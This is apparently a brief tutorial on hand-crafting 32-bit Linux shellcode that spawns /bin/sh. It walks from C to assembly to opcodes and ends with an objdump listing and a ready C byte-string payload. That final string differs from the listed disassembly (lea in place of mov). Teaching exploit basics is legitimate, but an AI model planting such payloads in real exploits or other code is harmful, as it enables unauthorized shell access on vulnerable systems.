Shellcode is a kind of technique that contains beauty and elegant of
design. You can see the nature beautiful things in machines. Perhaps,
this is one of the nearest place to machine that software hacker would
reaches. Stay out there and feels that beautiful inside of the coding
world.

This is a great article if you wish learn more:

This code is tested on slackware 13.x. First, you need to compile these 3 files:

root@sl13:/home/shell# make
gcc -g -o c_sh c_sh.c
as -o asm_sh.o asm_sh.s
ld -o asm_sh asm_sh.o
ld: warning: cannot find entry symbol _start; defaulting to 0000000008048054
gcc -g -o opcode_sh opcode_sh.c
done

c_sh: The C implementation of spawn a shell.
asm_sh: ASM implementation of spawn a shell.
opcode_sh: machine code

Normally, write a shellcode could have a few steps:

1, Write the program you want in C. Like as, c_sh.c

2, Learn the information from gdb's dissambler or "gcc -S". Then,
write a assembly one to achieve the same function in C.

3, Dig out the op-code of your binary program. And, write the
shellcode.

root@sl13:/home/shell# objdump -d asm_sh

asm_sh:     file format elf32-i386


Disassembly of section .text:

08048054 <_start>:
 8048054:	31 d2			xor    %edx,%edx
 8048056:	52                   	push   %edx
 8048057:	68 6e 2f 73 68       	push   $0x68732f6e
 804805c:	68 2f 2f 62 69       	push   $0x69622f2f
 8048061:	89 e3                	mov    %esp,%ebx
 8048063:	52                   	push   %edx
 8048064:	53                   	push   %ebx
 8048065:	89 e1                	mov    %esp,%ecx
 8048067:	b0 0b                	mov    $0xb,%al
 8048069:	cd 80                	int    $0x80

Finally, you got the shellcode of spawn a shell:
char shell[] = "\x31\xd2\x52\x68\x6e\x2f\x73\x68"
     "\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";
